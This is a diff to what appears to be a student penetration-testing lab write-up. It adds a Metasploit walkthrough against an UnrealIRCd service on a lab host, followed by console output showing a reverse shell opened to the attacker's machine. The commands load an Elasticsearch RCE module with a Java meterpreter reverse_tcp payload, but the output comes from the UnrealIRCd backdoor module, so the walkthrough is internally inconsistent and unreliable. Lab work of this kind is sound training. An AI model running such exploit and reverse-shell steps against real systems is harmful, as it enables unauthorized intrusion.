@@ -180,6 +180,56 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 139.93 seconds
 ```
 
+1. Method 1
+
+    Target port:
+
+    ```bash
+    ...
+    21/tcp   open   ftp         ProFTPD 1.3.5
+    ...
+    6697/tcp open   irc         UnrealIRCd
+    ...
+    ```
+
+    Start exploit:
+
+    ```bash
+    msfconsole
+    ```
+
+    ```bash
+    use exploit/multi/elasticsearch/script_mvel_rce
+    set RHOSTS 192.168.0.157
+    set RPORT 6697
+    set PAYLOAD java/meterpreter/reverse_tcp
+    set LHOST 192.168.0.155
+    set LPORT 4444
+    run
+    ```
+
+    Then get:
+
+    ```bash
+    msf exploit(unix/irc/unreal_ircd_3281_backdoor) > run
+    [*] Started reverse TCP double handler on 192.168.0.155:4444 
+    [*] 192.168.0.157:6697 - Connected to 192.168.0.157:6697...
+        :irc.TestIRC.net NOTICE AUTH :*** Looking up your hostname...
+        :irc.TestIRC.net NOTICE AUTH :*** Found your hostname (cached)
+    [*] 192.168.0.157:6697 - Sending backdoor command...
+    [*] Accepted the first client connection...
+    [*] Accepted the second client connection...
+    [*] Command: echo eP61IoaFA2vpus9r;
+    [*] Writing to socket A
+    [*] Writing to socket B
+    [*] Reading from sockets...
+    [*] Reading from socket A
+    [*] A: "eP61IoaFA2vpus9r\r\n"
+    [*] Matching...
+    [*] B is input...
+    [*] Command shell session 1 opened (192.168.0.155:4444 -> 192.168.0.157:52277) at 2025-11-25 01:05:56 -1000
+    ```
+
 ## L2 (Plus) - 172.16.0.97
 
 Scanning result:
@@ -320,4 +370,4 @@ Nmap done: 1 IP address (1 host up) scanned in 190.14 seconds
 | 313581047 | L2-M1 | 20% |
 | 313581038 | L0-M2 | 20% |
 | 313581055 | L0-M3 | 20% |
-| 412581005 | scanning & research | 20% |
+| 412581005 | L1-x | 20% |
